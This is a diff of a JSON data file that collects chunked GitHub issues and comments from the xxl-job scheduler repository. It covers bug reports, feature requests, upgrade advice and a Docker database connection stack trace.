+  "url": "https://github.com/xuxueli/xxl-job/issues/3914#issuecomment-4013175652",
+  "text": "当前设计为long，理论不会触达上限。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T17:59:50Z",
+    "updated_at": "2026-03-06T17:59:50Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3910_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1466,6 +2531,21 @@
     "state": "closed",
     "created_at": "2026-01-23T07:16:08Z",
     "updated_at": "2026-03-06T18:01:26Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3910_4013182030_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3910,
+  "chunk_index": 0,
+  "title": "unmappable character (0xC6) for encoding UTF-8",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3910#issuecomment-4013182030",
+  "text": "无法复现",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T18:01:22Z",
+    "updated_at": "2026-03-06T18:01:22Z"
   }
 }
 {
@@ -1499,6 +2579,96 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3906_3748568629_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3906,
+  "chunk_index": 0,
+  "title": "万人血书！！望适配信创数据库（达梦）",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3906#issuecomment-3748568629",
+  "text": "应该弄一万人star， 估计就会做了",
+  "metadata": {
+    "author": "tainger",
+    "created_at": "2026-01-14T09:18:07Z",
+    "updated_at": "2026-01-14T09:18:07Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3906_3770866121_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3906,
+  "chunk_index": 0,
+  "title": "万人血书！！望适配信创数据库（达梦）",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3906#issuecomment-3770866121",
+  "text": "on the way",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-01-20T03:32:55Z",
+    "updated_at": "2026-01-20T03:32:55Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3906_3809284877_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3906,
+  "chunk_index": 0,
+  "title": "万人血书！！望适配信创数据库（达梦）",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3906#issuecomment-3809284877",
+  "text": "2.0版本的也适配一下吧，我们这边环境就是用2.0的",
+  "metadata": {
+    "author": "Lan4jn",
+    "created_at": "2026-01-28T06:36:43Z",
+    "updated_at": "2026-01-28T06:36:43Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3906_3850515614_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3906,
+  "chunk_index": 0,
+  "title": "万人血书！！望适配信创数据库（达梦）",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3906#issuecomment-3850515614",
+  "text": "不应该让公司开发后合并进来么（你们信创收了多少心里没有点数么）？在这里道德绑架作者是什么意思嘛，吸开源的血一点钱不想出么？",
+  "metadata": {
+    "author": "hejianjun",
+    "created_at": "2026-02-05T01:03:20Z",
+    "updated_at": "2026-02-05T01:03:20Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3906_3869080410_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3906,
+  "chunk_index": 0,
+  "title": "万人血书！！望适配信创数据库（达梦）",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3906#issuecomment-3869080410",
+  "text": "sql都在xml里，ai就能改好，至于血书么",
+  "metadata": {
+    "author": "baibai326",
+    "created_at": "2026-02-09T03:25:47Z",
+    "updated_at": "2026-02-09T03:25:47Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3906_3956327296_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3906,
+  "chunk_index": 0,
+  "title": "万人血书！！望适配信创数据库（达梦）",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3906#issuecomment-3956327296",
+  "text": "我改了一版，有时间可以看看：https://github.com/Greenarrow1224/xxl-job-dm",
+  "metadata": {
+    "author": "Greenarrow1224",
+    "created_at": "2026-02-25T02:26:05Z",
+    "updated_at": "2026-02-25T02:26:05Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3905_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1511,6 +2681,36 @@
     "state": "closed",
     "created_at": "2026-01-12T07:27:34Z",
     "updated_at": "2026-01-15T06:40:26Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3905_3737252333_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3905,
+  "chunk_index": 0,
+  "title": "upgrade xxl-job-admin from 2.4.1 to 3.0.0, and i can not log in",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3905#issuecomment-3737252333",
+  "text": "It seems that the handling of special characters by the encryption algorithm has changed.",
+  "metadata": {
+    "author": "FIREcup",
+    "created_at": "2026-01-12T07:45:41Z",
+    "updated_at": "2026-01-12T07:45:41Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3905_3753118215_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3905,
+  "chunk_index": 0,
+  "title": "upgrade xxl-job-admin from 2.4.1 to 3.0.0, and i can not log in",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3905#issuecomment-3753118215",
+  "text": "The current approach is to reset the password.",
+  "metadata": {
+    "author": "FIREcup",
+    "created_at": "2026-01-15T06:40:23Z",
+    "updated_at": "2026-01-15T06:40:23Z"
   }
 }
 {
@@ -1544,6 +2744,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3903_4013226076_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3903,
+  "chunk_index": 0,
+  "title": "xxljob一秒一调度，调度成功，但是没有在规定的时间执行，导致任务执行失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3903#issuecomment-4013226076",
+  "text": "推测任务耗时或者调度请求网络慢，导致执行出现阻塞。可按需启用阻塞策略。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T18:09:56Z",
+    "updated_at": "2026-03-06T18:09:56Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3902_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1559,6 +2774,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3902_4013234860_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3902,
+  "chunk_index": 0,
+  "title": "多机部署路由规则失效问题",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3902#issuecomment-4013234860",
+  "text": "需进一步提供复现步骤",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T18:11:34Z",
+    "updated_at": "2026-03-06T18:11:34Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3900_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1571,6 +2801,21 @@
     "state": "closed",
     "created_at": "2026-01-08T00:48:07Z",
     "updated_at": "2026-03-06T18:12:33Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3900_4013240742_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3900,
+  "chunk_index": 0,
+  "title": "安全漏洞CVE-2025-7787针对jdk8有计划啥时修复吗?",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3900#issuecomment-4013240742",
+  "text": "建议升级3.x新版本，低版本排期中。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T18:12:29Z",
+    "updated_at": "2026-03-06T18:12:29Z"
   }
 }
 {
@@ -1604,6 +2849,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3898_3714814449_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3898,
+  "chunk_index": 0,
+  "title": "xxl-job provider netty_http server caught exception",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3898#issuecomment-3714814449",
+  "text": "无法复线，有条件建议升级",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-01-06T14:02:51Z",
+    "updated_at": "2026-01-06T14:02:51Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3897_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1619,6 +2879,51 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3897_3707603843_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3897,
+  "chunk_index": 0,
+  "title": "v3.3.1版本 访问http://localhost:8080/xxl-job-admin/login报错",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3897#issuecomment-3707603843",
+  "text": "无法复现，需要提供详细日志信息，以及复现步骤",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-01-04T04:07:48Z",
+    "updated_at": "2026-01-04T07:58:08Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3897_3727580848_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3897,
+  "chunk_index": 0,
+  "title": "v3.3.1版本 访问http://localhost:8080/xxl-job-admin/login报错",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3897#issuecomment-3727580848",
+  "text": "<img width=\"1132\" height=\"331\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/31d19369-317c-4adc-8388-72d39e0a72e2\" />\n\n只有这个错误,  没有别的日志了",
+  "metadata": {
+    "author": "cleven1",
+    "created_at": "2026-01-09T07:44:08Z",
+    "updated_at": "2026-01-13T07:36:09Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3897_4013249755_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3897,
+  "chunk_index": 0,
+  "title": "v3.3.1版本 访问http://localhost:8080/xxl-job-admin/login报错",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3897#issuecomment-4013249755",
+  "text": "确认是否release版本，境外可清理浏览器cookie重试。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-03-06T18:14:26Z",
+    "updated_at": "2026-03-06T18:14:26Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3896_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1630,6 +2935,21 @@
   "metadata": {
     "state": "closed",
     "created_at": "2025-12-31T06:48:52Z",
+    "updated_at": "2026-01-04T07:54:44Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3896_3707839238_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3896,
+  "chunk_index": 0,
+  "title": "我希望直接在参数上执行SQL 而不是执行存储过程",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3896#issuecomment-3707839238",
+  "text": "请按照ISSUE模板提供信息",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-01-04T07:54:44Z",
     "updated_at": "2026-01-04T07:54:44Z"
   }
 }
@@ -1649,6 +2969,36 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3894_3694615707_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3894,
+  "chunk_index": 0,
+  "title": "【提问】请问JobThread执行超时任务时，是否可以用线程池的submit",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3894#issuecomment-3694615707",
+  "text": "单任务会控制只允许新建单个线程，线程使用可控。\n为精准控制任务，短期不考虑内置线程池。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-28T09:53:02Z",
+    "updated_at": "2025-12-28T09:53:02Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3894_3695871149_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3894,
+  "chunk_index": 0,
+  "title": "【提问】请问JobThread执行超时任务时，是否可以用线程池的submit",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3894#issuecomment-3695871149",
+  "text": "是否考虑使用jdk21的虚拟线程，毕竟真实线程的创建开销太大",
+  "metadata": {
+    "author": "zhoule-le",
+    "created_at": "2025-12-29T08:47:43Z",
+    "updated_at": "2025-12-29T08:47:43Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3893_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -1661,5 +3011,500 @@
     "state": "closed",
     "created_at": "2025-12-26T13:44:27Z",
     "updated_at": "2025-12-28T09:23:31Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3893_3694598618_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3893,
+  "chunk_index": 0,
+  "title": "3.x版本的服务端 支持2.5的客户端吗",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3893#issuecomment-3694598618",
+  "text": "你好，上述两个版本支持搭配使用，调度中心与执行器通过restful协议通讯，不要求版本必须一致。\n——————\n但是，如有条件建议保持版本一致。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-28T09:23:31Z",
+    "updated_at": "2025-12-28T09:23:31Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3891_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3891,
+  "chunk_index": 0,
+  "title": "Possibly consider using a shorter maxLifetime value",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3891",
+  "text": "从3.2.0升级到3.3.1后，hikari一直警告，调低maxLifetime 后依然无法解决，最终导致任务调度全部停止\n\nThe last packet successfully received from the server was 8,603 milliseconds ago. The last packet sent successfully to the server was 8,611 milliseconds ago.). Possibly consider using a shorter maxLifetime value.\n2025-12-25 04:53:40.456 [xxl-job, admin JobRegistryMonitorHelper-registryOrRemoveThreadPool-1394104647] WARN  com.zaxxer.hikari.pool.PoolBase - HikariCP - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@5e4b0c70 (Communications link failure",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-25T09:52:31Z",
+    "updated_at": "2025-12-29T02:13:02Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3891_3694606324_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3891,
+  "chunk_index": 0,
+  "title": "Possibly consider using a shorter maxLifetime value",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3891#issuecomment-3694606324",
+  "text": "你好，需要确保调度中心与数据库网络保持通畅。\n另外，项目针对异常情况下数据库网络问题，强化设计自动恢复能力，相关代码已推送master分支，将会随下个版本发布。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-28T09:36:57Z",
+    "updated_at": "2025-12-28T09:36:57Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3891_3695267441_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3891,
+  "chunk_index": 0,
+  "title": "Possibly consider using a shorter maxLifetime value",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3891#issuecomment-3695267441",
+  "text": "目前通过调整 \nspring.datasource.hikari.minimum-idle=1\n删除 spring.datasource.hikari.connection-test-query=SELECT 1\nspring.datasource.hikari.validation-timeout=3000\n解决了问题，可能是因为用的云数据库，网络不够稳定，但之前版本从未出现此问题，虽然也会报警Possibly consider using a shorter maxLifetime value",
+  "metadata": {
+    "author": "JFreesoul",
+    "created_at": "2025-12-29T02:13:02Z",
+    "updated_at": "2025-12-29T02:13:02Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3890_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3890,
+  "chunk_index": 0,
+  "title": "希望新增执行器 名称长度限制同AppName",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3890",
+  "text": "名称长度限制为4~12",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-24T15:11:35Z",
+    "updated_at": "2026-04-26T06:13:39Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3890_3694607218_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3890,
+  "chunk_index": 0,
+  "title": "希望新增执行器 名称长度限制同AppName",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3890#issuecomment-3694607218",
+  "text": "感谢关注，欢迎PR。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-28T09:38:34Z",
+    "updated_at": "2025-12-28T09:38:34Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3890_3707534445_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3890,
+  "chunk_index": 0,
+  "title": "希望新增执行器 名称长度限制同AppName",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3890#issuecomment-3707534445",
+  "text": "上周刚在公司里改过，我过两天提交个PR，直接跑去js里改了，改了半天发现，在html里限制了",
+  "metadata": {
+    "author": "li7hai26",
+    "created_at": "2026-01-04T02:11:09Z",
+    "updated_at": "2026-01-04T02:11:09Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3890_3943966725_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3890,
+  "chunk_index": 0,
+  "title": "希望新增执行器 名称长度限制同AppName",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3890#issuecomment-3943966725",
+  "text": "@xuxueli  大佬有空瞅瞅哇",
+  "metadata": {
+    "author": "li7hai26",
+    "created_at": "2026-02-23T10:40:59Z",
+    "updated_at": "2026-02-23T10:40:59Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3890_4188775757_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3890,
+  "chunk_index": 0,
+  "title": "希望新增执行器 名称长度限制同AppName",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3890#issuecomment-4188775757",
+  "text": "master分支已经优化推送，将随下个版本发布。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-04-05T11:56:49Z",
+    "updated_at": "2026-04-05T11:56:49Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3889_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3889,
+  "chunk_index": 0,
+  "title": "3.3.0之后，网格点选中一行后，如果想操作下一行必须先取消当前行，能否优化为单行选中模式",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3889",
+  "text": "调度日志 模块里，查看了某行的执行日志，如果想查看下一行，必须先取消当前行的选中，再点击下一行。能否将网格优化成单行选择模式，这样操作会便捷很多。\n任务管理、执行器管理、用户管理 模块也是一样，如果能优化操作就轻松便捷很多。",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-23T07:03:35Z",
+    "updated_at": "2025-12-28T09:28:39Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3889_3690073109_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3889,
+  "chunk_index": 0,
+  "title": "3.3.0之后，网格点选中一行后，如果想操作下一行必须先取消当前行，能否优化为单行选中模式",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3889#issuecomment-3690073109",
+  "text": "赞同，希望操作更加人性化",
+  "metadata": {
+    "author": "315944211",
+    "created_at": "2025-12-24T15:14:16Z",
+    "updated_at": "2025-12-24T15:14:16Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3889_3690802140_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3889,
+  "chunk_index": 0,
+  "title": "3.3.0之后，网格点选中一行后，如果想操作下一行必须先取消当前行，能否优化为单行选中模式",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3889#issuecomment-3690802140",
+  "text": "直接把checkbox改为radio就好了",
+  "metadata": {
+    "author": "kfzx3427",
+    "created_at": "2025-12-25T03:23:48Z",
+    "updated_at": "2025-12-25T03:23:48Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3889_3690823086_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3889,
+  "chunk_index": 0,
+  "title": "3.3.0之后，网格点选中一行后，如果想操作下一行必须先取消当前行，能否优化为单行选中模式",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3889#issuecomment-3690823086",
+  "text": "感谢反馈，后续版本优化",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-25T03:49:46Z",
+    "updated_at": "2025-12-25T03:49:46Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3889_3694601527_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3889,
+  "chunk_index": 0,
+  "title": "3.3.0之后，网格点选中一行后，如果想操作下一行必须先取消当前行，能否优化为单行选中模式",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3889#issuecomment-3694601527",
+  "text": "你好，优化代码已经推送master分支，将会随下个版本发布。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-28T09:28:39Z",
+    "updated_at": "2025-12-28T09:28:39Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3886_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3886,
+  "chunk_index": 0,
+  "title": "docker 部署xxl-job 2.3.0 和 2.3.1连接docker-mysql数据库失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3886",
+  "text": "docker-mysql版本：5.7\nxxl-job 版本 2.3.1\n172.16.xx.xx ：是服务器ip（内网）\n\ndocker部署 脚本\ndocker run -e PARAMS=\"--spring.datasource.url=jdbc:mysql://172.16.0.1:3306/xxl_job?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&serverTimezone=Asia/Shanghai&useSSL=false --spring.datasource.username=root --spring.datasource.password=123456\" -p 8180:8080 -v /tmp:/data/applogs --name xxl-job-admin -d xuxueli/xxl-job-admin:2.3.1\n\n日志抛出异常：如下\nCaused by: java.sql.SQLNonTransientConnectionException: Could not create connection to database server. Attempted reconnect 3 times. Giving up.\nat com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:110)\nat com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97)\nat com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:89)\nat com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:63)\nat com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:73)\nat com.mysql.cj.jdbc.ConnectionImpl.co",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T10:02:56Z",
+    "updated_at": "2025-12-28T09:44:27Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3886_chunk_1",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3886,
+  "chunk_index": 1,
+  "title": "docker 部署xxl-job 2.3.0 和 2.3.1连接docker-mysql数据库失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3886",
+  "text": "jdbc.exceptions.SQLError.createSQLException(SQLError.java:73)\nat com.mysql.cj.jdbc.ConnectionImpl.connectWithRetries(ConnectionImpl.java:903)\nat com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:828)\nat com.mysql.cj.jdbc.ConnectionImpl.(ConnectionImpl.java:453)\nat com.mysql.cj.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:246)\nat com.mysql.cj.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:198)\nat com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:138)\nat com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:358)\nat com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:206)\nat com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:477)\nat com.zaxxer.hikari.pool.HikariPool.checkFailFast(HikariPool.java:560)\nat com.zaxxer.hikari.pool.HikariPool.(HikariPool.java:115)\nat com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:112)\nat org.springframework.jdbc.datasource.DataSourceUtils.fetchConnec",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T10:02:56Z",
+    "updated_at": "2025-12-28T09:44:27Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3886_chunk_2",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3886,
+  "chunk_index": 2,
+  "title": "docker 部署xxl-job 2.3.0 和 2.3.1连接docker-mysql数据库失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3886",
+  "text": "ection(HikariDataSource.java:112)\nat org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:158)\nat org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:116)\nat org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:79)\n... 25 common frames omitted\nCaused by: com.mysql.cj.exceptions.CJCommunicationsException: Communications link failure\n\nThe last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.\nat sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)\nat sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)\nat sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)\nat java.lang.reflect.Constructor.newInstance(Constructor.java:423)\nat com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:61)\nat",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T10:02:56Z",
+    "updated_at": "2025-12-28T09:44:27Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3886_chunk_3",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3886,
+  "chunk_index": 3,
+  "title": "docker 部署xxl-job 2.3.0 和 2.3.1连接docker-mysql数据库失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3886",
+  "text": ".java:423)\nat com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:61)\nat com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:105)\nat com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:151)\nat com.mysql.cj.exceptions.ExceptionFactory.createCommunicationsException(ExceptionFactory.java:167)\nat com.mysql.cj.protocol.a.NativeSocketConnection.connect(NativeSocketConnection.java:89)\nat com.mysql.cj.NativeSession.connect(NativeSession.java:144)\nat com.mysql.cj.jdbc.ConnectionImpl.connectWithRetries(ConnectionImpl.java:847)\n... 39 common frames omitted\nCaused by: java.net.ConnectException: Connection refused (Connection refused)\nat java.net.PlainSocketImpl.socketConnect(Native Method)\nat java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)\nat java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)\nat java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketIm",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T10:02:56Z",
+    "updated_at": "2025-12-28T09:44:27Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3886_chunk_4",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3886,
+  "chunk_index": 4,
+  "title": "docker 部署xxl-job 2.3.0 和 2.3.1连接docker-mysql数据库失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3886",
+  "text": "(AbstractPlainSocketImpl.java:206)\nat java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)\nat java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)\nat java.net.Socket.connect(Socket.java:607)\nat com.mysql.cj.protocol.StandardSocketFactory.connect(StandardSocketFactory.java:155)\nat com.mysql.cj.protocol.a.NativeSocketConnection.connect(NativeSocketConnection.java:63)\n... 41 common frames omitted\n\n请问各位大佬怎么解决!",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2025-12-19T10:02:56Z",
+    "updated_at": "2025-12-28T09:44:27Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3886_3678737832_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3886,
+  "chunk_index": 0,
+  "title": "docker 部署xxl-job 2.3.0 和 2.3.1连接docker-mysql数据库失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3886#issuecomment-3678737832",
+  "text": "推测网络不通，调度中心和执行器需要确保网络通畅，",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2025-12-21T12:10:03Z",
